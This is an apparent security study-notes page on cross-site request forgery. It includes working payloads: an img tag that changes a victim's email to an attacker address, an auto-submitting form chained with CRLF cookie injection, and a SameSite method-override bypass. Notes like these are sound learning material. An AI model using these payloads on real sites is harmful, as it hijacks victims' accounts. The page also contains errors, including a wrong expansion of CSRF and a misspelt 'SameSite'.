---
description: Let users who visit the website to perform actions they aren't supposed to do.
cover: https://www.plexal.com/wp-content/uploads/2023/05/MicrosoftTeams-image-171.png
coverY: 0
---

# CSRF

#### Client side request forgery allows an attacker to induce users to perform actions that they do not intend to perform.

## <mark style="color:red;">Deliver a CSRF Exploit</mark>

### <mark style="color:yellow;">**Reflected XSS**</mark>

#### <mark style="color:purple;">Attacker will place the malicious HTML onto a web site that they control.</mark>

### <mark style="color:yellow;">GET method</mark>

<mark style="color:purple;">**Example**</mark>

```html
<img src="https://vulnerable-website.com/email/change?email=attacker@evil-user.net"> 
```

## <mark style="color:red;">Common CSRF vulnerabilities</mark>

* Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.
* Some applications correctly validate the token when it is present but skip the validation if the token is omitted.
* Some applications do not validate that the token belongs to the same session as the user who is making the request.
* Some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions.

\
<mark style="color:purple;">**Example**</mark>

```html
<html>
  <body>
    <form action="https://vul-site.com/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;yahoo&#46;com" />
      <input type="hidden" name="csrf" value="jyLqs10iSdsMQz1S5jqucMF55ZyDRyQL" />
      <input type="submit" value="Submit request" />
    </form>
     <img src="http://vul-site.com/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key" onerror="document.forms[0].submit()"> 
  </body>
</html>
```

* Some applications do not maintain any server-side record of tokens that have been issued.
* Cookie **SasmeSite=Lax** bypass via method override. Change **POST** method to **Get** with **"\_method"** parameter. Example\
  &#x20;`/change-email?email=attacker@attack.net&_method=POST`

## <mark style="color:red;">Defenses</mark>

* [ ] CSRF tokens
* [ ] HTTP cookie header (csrf-key)
* [ ] Captcha
* [ ] HTTP Referer header
